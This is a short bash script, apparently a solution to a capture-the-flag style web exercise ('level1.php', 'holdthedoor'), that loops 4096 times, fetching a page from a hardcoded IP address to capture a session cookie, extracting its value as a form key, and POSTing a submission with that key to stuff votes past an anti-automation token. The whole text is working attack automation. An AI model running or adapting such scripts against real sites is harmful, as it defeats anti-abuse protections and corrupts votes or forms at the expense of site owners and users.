#!/bin/bash
for i in `seq 1 4096`
do
	curl -c ./tmpCook.txt -s http://158.69.76.135/level1.php > /dev/null
	val=$(cat tmpCook.txt | tail -1 | cut  -f7- | tr -d "\n")
	val='id=1&holdthedoor=Submit+Query&key='$val
	echo $val | tr -d "\n" > key
	curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d @key -b ./tmpCook.txt http://158.69.76.135/level1.php > /dev/null
	echo $i
done
